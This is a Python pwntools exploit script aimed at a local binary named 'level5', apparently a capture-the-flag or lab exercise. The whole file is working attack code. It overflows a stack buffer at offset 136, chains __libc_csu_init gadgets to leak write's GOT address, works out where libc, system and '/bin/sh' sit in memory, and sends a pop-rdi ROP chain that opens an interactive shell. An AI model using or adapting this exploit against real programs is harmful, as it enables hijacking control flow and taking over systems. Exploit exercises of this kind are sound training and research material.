from pwn import *

context.log_level = 'info'

level5 = ELF('./level5')
sh = process('./level5')
libc = ELF("./libc.so")

offset = 136
write_got = level5.got['write']
read_got = level5.got['read']
main_addr = level5.symbols['main']
bss_base = level5.bss()

csu_front_addr = 0x400600
csu_end_addr = 0x40061A

def csu(rbx, rbp, r12, r13, r14, r15, last):
    payload = b'a' * offset
    payload += p64(csu_end_addr)
    payload += p64(rbx) + p64(rbp) + p64(r12) + p64(r13) + p64(r14) + p64(r15)
    payload += p64(csu_front_addr)
    payload += b'a' * 0x38
    payload += p64(last)
    sh.send(payload)
    sleep(0.5)

# Leak write
sh.recvuntil(b'Hello, World\n')
csu(0, 1, write_got, 1, write_got, 8, main_addr)
write_addr = u64(sh.recv(8))

libc_base = write_addr - libc.symbols['write']
system_addr = libc_base + libc.symbols['system']
binsh_addr = libc_base + next(libc.search(b'/bin/sh'))

log.info(f"libc_base: {hex(libc_base)}")
log.info(f"system: {hex(system_addr)}")
log.info(f"/bin/sh: {hex(binsh_addr)}")

# 使用 one_gadget 可能更简单
# 先检查 one_gadget
log.info("Trying one_gadget...")
os.system("one_gadget libc.so 2>/dev/null || echo 'one_gadget not found'")

# 使用 ROP 调用 system
rop = ROP(level5)
pop_rdi = rop.find_gadget(['pop rdi', 'ret'])[0]

if pop_rdi:
    log.info(f"Using pop rdi gadget at {hex(pop_rdi)}")
    
    sh.recvuntil(b'Hello, World\n')
    payload = b'a' * offset
    payload += p64(pop_rdi)
    payload += p64(binsh_addr)
    payload += p64(system_addr)
    sh.send(payload)
    
    sh.interactive()
else:
    log.error("No pop rdi gadget found")